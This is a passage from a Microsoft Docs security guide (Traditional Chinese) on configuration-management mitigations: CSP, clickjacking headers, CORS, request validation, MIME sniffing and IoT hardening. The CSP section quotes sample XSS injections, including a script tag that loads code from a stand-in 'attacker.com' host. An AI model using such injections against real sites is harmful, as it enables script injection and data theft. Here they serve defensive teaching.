---
title: 組態管理 - Microsoft Threat Modeling Tool - Azure | Microsoft Docs
description: 降低威脅模型化工具所暴露的威脅
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.openlocfilehash: 07a86345e49081320663d7706310a71a40ace134
ms.sourcegitcommit: 1fb353cfca800e741678b200f23af6f31bd03e87
ms.translationtype: HT
ms.contentlocale: zh-TW
ms.lasthandoff: 08/30/2018
ms.locfileid: "43302102"
---
# <a name="security-frame-configuration-management--mitigations"></a>安全框架︰組態管理 | 緩和措施 
| 產品/服務 | 文章 |
| --------------- | ------- |
| **Web 應用程式** | <ul><li>[實作內容安全性原則 (CSP)，並停用內嵌 javascript](#csp-js)</li><li>[啟用瀏覽器的 XSS 篩選器](#xss-filter)</li><li>[ASP.NET 應用程式必須在部署前停用追蹤和偵錯](#trace-deploy)</li><li>[僅從信任的來源存取第三方 javascript](#js-trusted)</li><li>[確保已驗證的 ASP.NET 頁面納入 UI 偽裝或點擊劫持防禦功能](#ui-defenses)</li><li>[確保在 ASP.NET Web 應用程式上啟用 CORS 的情況下只允許信任的原始來源](#cors-aspnet)</li><li>[在 ASP.NET 頁面上啟用 ValidateRequest 屬性](#validate-aspnet)</li><li>[使用在本機裝載的最新 JavaScript 程式庫版本](#local-js)</li><li>[停用自動 MIME 探查](#mime-sniff)</li><li>[移除 Windows Azure 網站上的標準伺服器標頭以避免記錄特徵](#standard-finger)</li></ul> |
| **資料庫** | <ul><li>[設定用於 Database Engine 存取的 Windows 防火牆](#firewall-db)</li></ul> |
| **Web API** | <ul><li>[確保在 ASP.NET Web API 上啟用 CORS 的情況下只允許信任的原始來源](#cors-api)</li><li>[加密包含敏感性資料的 Web API 組態檔區段](#config-sensitive)</li></ul> |
| **IoT 裝置** | <ul><li>[確保使用強式認證保護所有系統管理介面](#admin-strong)</li><li>[確保無法在裝置上執行不明的程式碼](#unknown-exe)</li><li>[使用 Bitlocker 將 IoT 裝置的 OS 和其他磁碟分割加密](#partition-iot)</li><li>[確保在裝置上只啟用最少的服務/功能](#min-enable)</li></ul> |
| **IoT 現場閘道** | <ul><li>[使用 Bitlocker 將 IoT 現場閘道的 OS 和其他磁碟分割加密](#field-bit-locker)</li><li>[確保在安裝期間變更現場閘道的預設登入認證](#default-change)</li></ul> |
| **IoT 雲端閘道** | <ul><li>[確保雲端閘道會實作相關程序讓連接的裝置韌體保持最新狀態](#cloud-firmware)</li></ul> |
| **電腦信任邊界** | <ul><li>[確保裝置已根據組織的原則設定端點安全性控制項](#controls-policies)</li></ul> |
| **Azure 儲存體** | <ul><li>[確保 Azure 儲存體存取金鑰的安全管理](#secure-keys)</li><li>[確保在 Azure 儲存體上啟用 CORS 的情況下只允許信任的原始來源](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[啟用 WCF 的服務節流功能](#throttling)</li><li>[WCF-透過中繼資料的資訊洩漏](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>實作內容安全性原則 (CSP)，並停用內嵌 javascript

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | [內容安全性原則簡介](http://www.html5rocks.com/en/tutorials/security/content-security-policy/)、[內容安全性原則參考](http://content-security-policy.com/)、[安全性功能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)、[內容安全性原則簡介](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy)、[我可以使用 CSP 嗎？](http://caniuse.com/#feat=contentsecuritypolicy) |
| **步驟** | <p>內容安全性原則 (CSP) 是深度防禦安全性機制、W3C 標準，可讓 Web 應用程式擁有者能控制其網站中內嵌的內容。 CSP 會新增為 Web 伺服器上的 HTTP 回應標頭，並由瀏覽器在用戶端上強制執行。 這是以允許清單為基礎的原則 - 網站可以宣告一組可從中載入主動式內容 (例如 JavaScript) 的受信任網域。</p><p>CSP 具有以下安全性優勢：</p><ul><li>**防禦 XSS︰** 如果頁面遭受 XSS 威脅，攻擊者入侵它的方式有 2 種︰<ul><li>插入 `<script>malicious code</script>`。 此入侵將因為 CSP 的基礎限制 1 而無法運作</li><li>插入 `<script src=”http://attacker.com/maliciousCode.js”/>`。 此入侵無法運作，因為攻擊者所控制的網域不在網域的 CSP 白名單中</li></ul></li><li>**控制資料外洩︰** 如果網頁上的任何惡意內容嘗試連線至外部網站並竊取資料，CSP 將會中止連線。 這是因為目標網域不在 CSP 的允許清單中</li><li>**防禦點擊劫持：** 點擊劫持 (Clickjacking) 是一種攻擊技巧，敵人可用來建構真正的網站並強制使用者點按 UI 項目。 目前可藉由設定回應標頭- X-Frame-Options 來防禦點擊劫持。 並非所有瀏覽器都遵守此標頭，而轉寄 CSP 會是防禦點擊劫持的標準方法</li><li>**即時攻擊報告︰** 如果已啟用 CSP 的網站上有資料隱碼攻擊，則瀏覽器會自動對 Web 伺服器上設定的端點觸發通知。 如此一來，CSP 可當作即時警告系統。</li></ul> |

### <a name="example"></a>範例
範例原則︰ 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
此原則只允許從 Web 應用程式的伺服器和 google 分析伺服器載入指令碼。 將會拒絕從任何其他網站載入的指令碼。 在網站上啟用 CSP 後，下列功能會自動停用以緩和 XSS 攻擊。 

### <a name="example"></a>範例
將不會執行內嵌指令碼。 以下是內嵌指令碼的範例 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>範例
字串不會評估為程式碼。 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>啟用瀏覽器的 XSS 篩選器

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | [XSS 防護篩選器](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **步驟** | <p>X-XSS-Protection 回應標頭設定可控制瀏覽器的跨網站指令碼篩選器。 此回應標頭可以有下列值︰</p><ul><li>`0:` 這會停用篩選器</li><li>`1: Filter enabled` 如果偵測到跨網站指令碼攻擊，為了停止攻擊，瀏覽器將會淨化頁面</li><li>`1: mode=block : Filter enabled`。 偵測到 XSS 攻擊時，瀏覽器不會呈現網頁呈現，而非淨化頁面</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`。 瀏覽器將會淨化頁面並報告違規情形。</li></ul><p>這是一項 Chromium 功能，其利用 CSP 違規報告將詳細資料傳送至您所選的 URI。 最後 2 個選項會被視為安全值。</p>|

## <a id="trace-deploy"></a>ASP.NET 應用程式必須在部署前停用追蹤和偵錯

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | [ASP.NET 偵錯概觀](http://msdn2.microsoft.com/library/ms227556.aspx)、[ASP.NET 追蹤概觀](http://msdn2.microsoft.com/library/bb386420.aspx)、[作法：對 ASP.NET 應用程式啟用追蹤](http://msdn2.microsoft.com/library/0x5wc973.aspx)、[作法：對 ASP.NET 應用程式啟用偵錯](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **步驟** | 啟用頁面的追蹤後，每個要求該頁面的瀏覽器也會取得包含內部伺服器狀態和工作流程相關資料的追蹤資訊。 這項資訊可能是安全性相關資訊。 啟用頁面偵錯後，在伺服器上發生的錯誤會導致對瀏覽器呈現完整堆疊追蹤資料。 該資料可能會公開有關伺服器工作流程的安全性相關資訊。 |

## <a id="js-trusted"></a>僅從信任的來源存取第三方 javascript

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | N/A  |
| **步驟** | 僅能從信任的來源參照第三方 JavaScript。 參考端點應一律位於 SSL。 |

## <a id="ui-defenses"></a>確保已驗證的 ASP.NET 頁面納入 UI 偽裝或點擊劫持防禦功能

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | [OWASP 點擊劫持防禦功能提要](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet)、[IE 內部 - 使用 X-Frame-Options 對抗點擊劫持](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
| **步驟** | <p>點擊劫持 (Clickjacking) 也稱為「UI 偽裝攻擊」，當使用者打算按一下最上層頁面時，攻擊者會使用多重透明或不透明層級來誘騙使用者按一下另一個頁面上的按鈕或連結。</p><p>使用 iframe 製作惡意頁面，以載入受害者的頁面，即可達成此分層處理。 因此，攻擊者會「劫持」頁面所需的點擊，並將其路由傳送至另一個頁面，該頁面最可能由另一個應用程式、網域或兩者所擁有。 若要避免點擊劫持攻擊，請設定適當的 X-Frame-Options HTTP 回應標頭，以指示瀏覽器不允許從其他網域進行框架處理</p>|

### <a name="example"></a>範例
可以透過 IIS web.config 設定 X-FRAME-OPTIONS 標頭。決不能進行框架處理之網站的 Web.config 程式碼片段︰ 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>範例
只能由相同網域中的網頁進行框架處理之網站的 Web.config 程式碼︰ 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>確保在 ASP.NET Web 應用程式上啟用 CORS 的情況下只允許信任的原始來源

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | Web Form、MVC5 |
| **屬性**              | N/A  |
| **參考**              | N/A  |
| **步驟** | <p>瀏覽器安全性可防止網頁對另一個網域提出 AJAX 要求。 這項限制也稱為同源原則，可防止惡意網站從另一個網站讀取敏感性資料。 不過，有時候可能需要安全地公開其他網站可以取用的 API。 跨原始來源資源共用 (CORS) 是 W3C 標準，可讓伺服器放寬同源原則。 使用 CORS，伺服器可以明確允許某些跨源要求，然而拒絕其他要求。</p><p>相較於早期技術 (例如 JSONP)，CORS 較為安全且更具彈性。 基本上，啟用 CORS 會轉變成將一些 HTTP 回應標頭 (Access-Control-*) 新增到 Web 應用程式，而其完成方式有好幾種。</p>|

### <a name="example"></a>範例
如果可以存取 Web.config，即可透過下列程式碼新增 CORS︰ 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>範例
如果無法存取 Web.config，則可藉由新增下列 CSharp 程式碼來設定 CORS︰ 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

請注意，務必要確保 "Access-Control-Allow-Origin" 屬性中的原始來源清單設定為一組有限且受信任的原始來源。 無法適當地進行此設定 (例如將值設定為 '*') 會讓惡意網站在沒有任何限制的情況下，觸發對 Web 應用程式的跨源要求，而使應用程式容易遭受 CSRF 攻擊。 

## <a id="validate-aspnet"></a>在 ASP.NET 頁面上啟用 ValidateRequest 屬性

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | Web Form、MVC5 |
| **屬性**              | N/A  |
| **參考**              | [要求驗證 - 預防指令碼攻擊](http://www.asp.net/whitepapers/request-validation) |
| **步驟** | <p>要求驗證 (1.1 版後的 ASP.NET 功能) 可防止伺服器接受包含未編碼 HTML 的內容。 這項功能設計用來協助防止某些指令碼資料隱碼攻擊，因此不知不覺地將用戶端指令碼或 HTML 提交至伺服器、加以儲存，而後呈現給其他使用者。 我們仍強烈建議您驗證所有輸入資料，而且適時進行 HTML 編碼。</p><p>藉由比較所有輸入資料與有潛在危險的值清單來執行要求驗證。 如果相符，ASP.NET 會引發 `HttpRequestValidationException`。 預設會啟用要求驗證功能。</p>|

### <a name="example"></a>範例
不過，這項功能可以在頁面層級停用︰ 
```XML
<%@ Page validateRequest="false" %> 
```
或在應用程式層級停用 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
請注意，要求驗證功能不受支援，而且不是 MVC6 管線的一部分。 

## <a id="local-js"></a>使用在本機裝載的最新 JavaScript 程式庫版本

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | N/A  |
| **步驟** | <p>使用 JQuery 之類標準 JavaScript 程式庫的開發人員必須使用已核准且不包含已知安全性缺陷的通用 JavaScript 程式庫版本。 最好是使用最新版的程式庫，因為其包含舊版中已知弱點的安全性問題修正。</p><p>如果因為相容性理由而無法使用最新版本，則應該使用低於最小版本的版本。</p><p>可接受的最小版本︰</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Validate 1.9</li><li>JQuery Mobile 1.0.1</li><li>JQuery Cycle 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Ajax Control Toolkit**<ul><li>Ajax Control Toolkit 40412</li></ul></li><li>**ASP.NET Web Form 和 Ajax**<ul><li>ASP.NET Web Form 和 Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>決不會從外部網站 (例如 public CDN) 載入任何 JavaScript 程式庫</p>|

## <a id="mime-sniff"></a>停用自動 MIME 探查

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | [IE8 Security Part V：完善的保護](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx)、[MIME 類型](http://en.wikipedia.org/wiki/Mime_type) |
| **步驟** | X-Content-Type-Options 標頭是可讓開發人員指定不應對其內容探查 MIME 的 HTTP 標頭。 此標頭是設計用來降低 MIME 探查攻擊的風險。 對於可能包含使用者可控制內容的每個頁面，您必須使用 HTTP 標頭 Header X-Content-Type-Options:nosniff。 若要為應用程式中的所有頁面全域啟用必要標頭，您可以執行下列其中一項︰|

### <a name="example"></a>範例
如果應用程式是由 Internet Information Services (IIS) 7 或更新版本所裝載，請在 web.config 檔案中新增標頭 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>範例
透過全域 Application\_BeginRequest 新增標頭 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>範例
實作自訂 HTTP 模組 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>範例
您可以透過將必要標頭新增至個別回應，來單獨針對特定頁面啟用此標頭︰ 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>移除 Windows Azure 網站上的標準伺服器標頭以避免記錄特徵

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web 應用程式 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | EnvironmentType - Azure |
| **參考**              | [移除 Windows Azure 網站上的標準伺服器標頭](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **步驟** | Server、X-Powered-By、X-AspNet-Version 等標頭會揭露有關伺服器和基礎技術的資訊。 建議不要顯示這些標頭，藉此防止記錄應用程式特徵 |

## <a id="firewall-db"></a>設定用於 Database Engine 存取的 Windows 防火牆

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | 資料庫 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | SQL Azure、OnPrem |
| **屬性**              | N/A、SQL 版本 - V12 |
| **參考**              | [如何設定 Azure SQL Database](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/)、[設定用於 Database Engine 存取的 Windows 防火牆](https://msdn.microsoft.com/library/ms175043) |
| **步驟** | 防火牆系統有助於防止未經授權存取電腦資源。 若要透過防火牆存取 SQL Server 資料庫引擎的執行個體，您必須在執行 SQL Server 的電腦上設定防火牆以允許存取 |

## <a id="cors-api"></a>確保在 ASP.NET Web API 上啟用 CORS 的情況下只允許信任的原始來源

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web API | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | MVC 5 |
| **屬性**              | N/A  |
| **參考**              | [在 ASP.NET Web API 2 中啟用跨源要求](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api)、[ASP.NET Web API - ASP.NET Web API 2 中的 CORS 支援](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **步驟** | <p>瀏覽器安全性可防止網頁對另一個網域提出 AJAX 要求。 這項限制也稱為同源原則，可防止惡意網站從另一個網站讀取敏感性資料。 不過，有時候可能需要安全地公開其他網站可以取用的 API。 跨原始來源資源共用 (CORS) 是 W3C 標準，可讓伺服器放寬同源原則。</p><p>使用 CORS，伺服器可以明確允許某些跨源要求，然而拒絕其他要求。 相較於早期技術 (例如 JSONP)，CORS 較為安全且更具彈性。</p>|

### <a name="example"></a>範例
在 App_Start/WebApiConfig.cs 中，將下列程式碼新增至 WebApiConfig.Register 方法 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>範例
EnableCors 屬性可套用至控制器中的動作方法，如下所示︰ 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

請注意，務必要確保 EnableCors 屬性中的原始來源清單設定為一組有限且受信任的原始來源。 無法適當地進行此設定 (例如將值設定為 '*') 會讓惡意網站在沒有任何限制的情況下，觸發對 API 的跨源要求，而使 API 容易遭受 CSRF 攻擊。 可以在控制器層級裝飾 EnableCors。 

### <a name="example"></a>範例
若要在類別中的特定方法上停用 CORS，可以使用 DisableCors 屬性，如下所示︰ 
```csharp
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web API | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | MVC 6 |
| **屬性**              | N/A  |
| **參考**              | [在 ASP.NET Core 1.0 中啟用跨源要求](https://docs.asp.net/en/latest/security/cors.html)。 |
| **步驟** | <p>在 ASP.NET Core 1.0 中，可以使用中介軟體或使用 MVC 啟用 CORS。 使用 MVC 來啟用 CORS 時，會使用相同的 CORS 服務，但不會使用 CORS 中介軟體。</p>|

**方法 1** 使用中介軟體啟用 CORS︰若要針對整個應用程式啟用 CORS，請使用 UseCors 擴充方法，將 CORS 中介軟體新增至要求管線。 使用 CorsPolicyBuilder 類別新增 CORS 中介軟體時，可以指定跨源原則。 作法有二：

### <a name="example"></a>範例
第一種方法是使用 Lambda 呼叫 UseCors。 Lambda 會採用 CorsPolicyBuilder 物件︰ 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>範例
第二種方法是定義一或多個具名 CORS 原則，然後在執行階段依名稱選取原則。 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**方法 2** 在 MVC 中啟用 CORS︰開發人員也可以使用 MVC 來套件每個動作、每個控制站或適用於所有控制站的特定 CORS。

### <a name="example"></a>範例
每個動作︰若要指定特定動作的 CORS 原則，請將 [EnableCors] 屬性套用至該動作。 指定原則名稱。 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>範例
每個控制站︰ 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>範例
全域︰ 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
請注意，務必要確保 EnableCors 屬性中的原始來源清單設定為一組有限且受信任的原始來源。 無法適當地進行此設定 (例如將值設定為 '*') 會讓惡意網站在沒有任何限制的情況下，觸發對 API 的跨源要求，而使 API 容易遭受 CSRF 攻擊。 

### <a name="example"></a>範例
若要停用某個控制器或動作的 CORS，請使用 [DisableCors] 屬性。 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>加密包含敏感性資料的 Web API 組態檔區段

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Web API | 
| **SDL 階段**               | 部署 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | [作法：在 ASP.NET 2.0 中使用 DPAPI 加密組態區段](https://msdn.microsoft.com/library/ff647398.aspx)、[指定受保護的組態提供者](https://msdn.microsoft.com/library/68ze1hb2.aspx)、[使用 Azure Key Vault 來保護應用程式的機密資訊](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **步驟** | 組態檔 (例如 Web.config、appsettings.json) 常會用來敏感性資訊，包括使用者名稱、密碼、資料庫連接字串和加密金鑰。 如果您不保護這項資訊，您的應用程式會很容易受到攻擊者或惡意使用者攻擊，而被其取得敏感性資訊，例如帳戶使用者名稱和密碼、資料庫名稱和伺服器名稱。 請根據部署類型 (Azure/內部部署)，使用 DPAPI 或服務 (例如 Azure Key Vault) 加密組態檔的敏感性區段。 |

## <a id="admin-strong"></a>確保使用強式認證保護所有系統管理介面

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | IoT 裝置 | 
| **SDL 階段**               | 部署 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | N/A  |
| **步驟** | 您應使用強式認證來保護裝置或現場閘道公開的任何系統管理介面。 此外，對於任何公開的介面 (如 WiFi、SSH、檔案共用)，應使用強式認證保護 FTP。 不得使用預設弱式密碼。 |

## <a id="unknown-exe"></a>確保無法在裝置上執行不明的程式碼

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | IoT 裝置 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | [在 Windows 10 IoT Core 上啟用安全開機和 BitLocker 裝置加密](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
| **步驟** | 「UEFI 安全開機」會將系統限制為只允許執行指定的授權單位所簽署的二進位檔。 這項功能可防止不明程式碼在平台上執行並可能使其安全性狀態變弱。 啟用「UEFI 安全開機」並限制受託簽署程式碼的憑證授權單位清單。 使用其中一個受信任的授權單位簽署在裝置上部署的所有程式碼。 |

## <a id="partition-iot"></a>使用 Bitlocker 將 IoT 裝置的 OS 和其他磁碟分割加密

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | IoT 裝置 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | N/A  |
| **步驟** | Windows 10 IoT Core 會實作 BitLocker 裝置加密的輕量型版本，其高度相依於平台上的 TPM 目前狀態，包括 UEFI 中可採取必要措施的必要 preOS 通訊協定。 這些 preOS 措施可確保 OS 稍後有 OS 啟動方式的明確記錄。使用 Bitlocker 加密 OS 磁碟分割以及任何其他磁碟分割，以防這些磁碟分割儲存任何敏感性資料。 |

## <a id="min-enable"></a>確保在裝置上只啟用最少的服務/功能

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | IoT 裝置 | 
| **SDL 階段**               | 部署 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | N/A  |
| **步驟** | 請勿在並非解決方案運作所需的 OS 中啟用或關閉任何功能或服務。 例如︰如果裝置不需要部署 UI，請在無周邊模式下安裝 Windows IoT Core。 |

## <a id="field-bit-locker"></a>使用 Bitlocker 將 IoT 現場閘道的 OS 和其他磁碟分割加密

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | IoT 現場閘道 | 
| **SDL 階段**               | 部署 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | N/A  |
| **步驟** | Windows 10 IoT Core 會實作 BitLocker 裝置加密的輕量型版本，其高度相依於平台上的 TPM 目前狀態，包括 UEFI 中可採取必要措施的必要 preOS 通訊協定。 這些 preOS 措施可確保 OS 稍後有 OS 啟動方式的明確記錄。使用 Bitlocker 加密 OS 磁碟分割以及任何其他磁碟分割，以防這些磁碟分割儲存任何敏感性資料。 |

## <a id="default-change"></a>確保在安裝期間變更現場閘道的預設登入認證

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | IoT 現場閘道 | 
| **SDL 階段**               | 部署 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | N/A  |
| **步驟** | 確保在安裝期間變更現場閘道的預設登入認證 |

## <a id="cloud-firmware"></a>確保雲端閘道實作相關程序讓連接的裝置韌體保持最新狀態

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | IoT 雲端閘道 | 
| **SDL 階段**               | 建置 |  
| **適用的技術** | 泛型 |
| **屬性**              | 閘道選擇 - Azure IoT 中樞 |
| **參考**              | [IoT 中樞裝置管理概觀](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/)、[如何更新裝置韌體](https://docs.microsoft.com/azure/iot-hub/tutorial-firmware-update) |
| **步驟** | LWM2M 是來自 Open Mobile Alliance 且適用於 IoT 裝置管理的通訊協定。 Azure IoT 裝置管理可讓您使用裝置工作來與實體裝置進行互動。 確保雲端閘道會實作相關程序，以使用 Azure IoT 中樞裝置管理讓裝置和其他組態資料常保最新狀態。 |

## <a id="controls-policies"></a>確保裝置已根據組織的原則設定端點安全性控制項

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | 電腦信任邊界 | 
| **SDL 階段**               | 部署 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
| **參考**              | N/A  |
| **步驟** | 確保裝置有根據組織安全性原則設定的端點安全性控制項，例如適用於磁碟層級加密的 bitlocker、採用更新後簽章的防毒軟體、主機型防火牆、OS 升級、群組原則等。 |

## <a id="secure-keys"></a>確保 Azure 儲存體存取金鑰的安全管理

| 標題                   | 詳細資料      |
| ----------------------- | ------------ |
| **元件**               | Azure 儲存體 | 
| **SDL 階段**               | 部署 |  
| **適用的技術** | 泛型 |
| **屬性**              | N/A  |
